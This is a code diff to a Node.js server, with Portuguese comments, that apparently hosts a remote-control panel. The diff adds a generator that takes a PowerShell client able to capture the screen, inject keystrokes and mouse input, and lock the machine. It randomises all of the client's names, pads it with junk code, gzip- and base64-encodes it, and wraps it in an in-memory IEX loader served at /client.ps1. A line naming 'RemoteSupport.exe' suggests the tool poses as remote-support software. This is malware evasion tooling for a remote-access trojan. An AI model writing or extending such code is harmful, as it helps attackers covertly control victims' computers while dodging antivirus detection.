@@ -7,6 +7,106 @@ import { fileURLToPath } from 'url';
 import { dirname } from 'path';
 import jwt from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
+import zlib from 'zlib';
+
+// Gerador de código polimórfico
+function generatePolymorphicClient() {
+  const randStr = () => {
+    const chars = 'abcdefghijklmnopqrstuvwxyz';
+    let r = chars[Math.floor(Math.random() * chars.length)];
+    for (let i = 0; i < 7 + Math.floor(Math.random() * 8); i++) {
+      r += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return r;
+  };
+
+  const randNum = () => Math.floor(Math.random() * 9000) + 1000;
+  const randComment = () => `# ${randStr()}${randNum()}`;
+  const junk = () => {
+    const junks = [
+      `$${randStr()}=${randNum()}`,
+      `$${randStr()}='${randStr()}'`,
+      `$${randStr()}=$null`,
+      `$${randStr()}=[Math]::Abs(${randNum()})`,
+    ];
+    return junks[Math.floor(Math.random() * junks.length)];
+  };
+
+  // Variáveis polimórficas
+  const v = {
+    URL: randStr(), id: randStr(), run: randStr(), panel: randStr(),
+    locked: randStr(), lockProcess: randStr(), lockFile: randStr(),
+    scale: randStr(), quality: randStr(), VK: randStr(),
+    HWID: randStr(), Screen: randStr(), GetVK: randStr(),
+    DoClick: randStr(), DoKey: randStr(), DoCombo: randStr(),
+    DoScroll: randStr(), DoMove: randStr(), Lock: randStr(),
+    Unlock: randStr(), Run: randStr(), inputCode: randStr(),
+  };
+
+  const originalCode = readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'public', 'client.ps1'), 'utf-8');
+
+  let code = originalCode
+    .replace(/\$Global:URL/g, `$Global:${v.URL}`)
+    .replace(/\$Global:id/g, `$Global:${v.id}`)
+    .replace(/\$Global:run/g, `$Global:${v.run}`)
+    .replace(/\$Global:panel/g, `$Global:${v.panel}`)
+    .replace(/\$Global:locked/g, `$Global:${v.locked}`)
+    .replace(/\$Global:lockProcess/g, `$Global:${v.lockProcess}`)
+    .replace(/\$Global:lockFile/g, `$Global:${v.lockFile}`)
+    .replace(/\$Global:scale/g, `$Global:${v.scale}`)
+    .replace(/\$Global:quality/g, `$Global:${v.quality}`)
+    .replace(/\$Global:VK/g, `$Global:${v.VK}`)
+    .replace(/function HWID/g, `function ${v.HWID}`)
+    .replace(/hwid = HWID/g, `hwid = ${v.HWID}`)
+    .replace(/function Screen/g, `function ${v.Screen}`)
+    .replace(/\$cap = Screen/g, `$cap = ${v.Screen}`)
+    .replace(/function GetVK/g, `function ${v.GetVK}`)
+    .replace(/GetVK \$/g, `${v.GetVK} $`)
+    .replace(/function DoClick/g, `function ${v.DoClick}`)
+    .replace(/{ DoClick /g, `{ ${v.DoClick} `)
+    .replace(/function DoKey/g, `function ${v.DoKey}`)
+    .replace(/{ DoKey /g, `{ ${v.DoKey} `)
+    .replace(/function DoCombo/g, `function ${v.DoCombo}`)
+    .replace(/{ DoCombo /g, `{ ${v.DoCombo} `)
+    .replace(/function DoScroll/g, `function ${v.DoScroll}`)
+    .replace(/{ DoScroll /g, `{ ${v.DoScroll} `)
+    .replace(/function DoMove/g, `function ${v.DoMove}`)
+    .replace(/{ DoMove /g, `{ ${v.DoMove} `)
+    .replace(/function Lock\(/g, `function ${v.Lock}(`)
+    .replace(/{ Lock \$/g, `{ ${v.Lock} $`)
+    .replace(/function Unlock/g, `function ${v.Unlock}`)
+    .replace(/; Unlock/g, `; ${v.Unlock}`)
+    .replace(/{ Unlock }/g, `{ ${v.Unlock} }`)
+    .replace(/function Run/g, `function ${v.Run}`)
+    .replace(/\n\nRun$/g, `\n\n${v.Run}`)
+    .replace(/\$inputCode/g, `$${v.inputCode}`);
+
+  // Adicionar junk no início
+  let junkCode = '';
+  for (let i = 0; i < 5 + Math.floor(Math.random() * 10); i++) {
+    junkCode += junk() + '\n';
+  }
+
+  code = `${randComment()}\n${junkCode}${randComment()}\n${code}`;
+
+  // Comprimir com GZip e converter para Base64
+  const compressed = zlib.gzipSync(Buffer.from(code, 'utf-8'));
+  const b64 = compressed.toString('base64');
+
+  // Gerar loader polimórfico
+  const lv = { d: randStr(), m: randStr(), g: randStr(), r: randStr() };
+
+  const loader = `${randComment()}
+$${lv.d}=[Convert]::FromBase64String('${b64}')
+$${lv.m}=New-Object IO.MemoryStream(,$${lv.d})
+$${lv.g}=New-Object IO.Compression.GZipStream($${lv.m},[IO.Compression.CompressionMode]::Decompress)
+$${lv.r}=New-Object IO.StreamReader($${lv.g})
+${junk()}
+IEX $${lv.r}.ReadToEnd()
+${randComment()}`;
+
+  return loader;
+}
 
 // Get country from IP
 async function getCountryFromIP(ip) {
@@ -135,6 +235,19 @@ const server = createServer((req, res) => {
   if (req.url === '/c') {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('RemoteSupport.exe');
+    return;
+  }
+
+  // Client.ps1 polimórfico
+  if (req.url === '/client.ps1') {
+    try {
+      const polyCode = generatePolymorphicClient();
+      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+      res.end(polyCode);
+    } catch (e) {
+      res.writeHead(500);
+      res.end('Error generating client');
+    }
     return;
   }
 
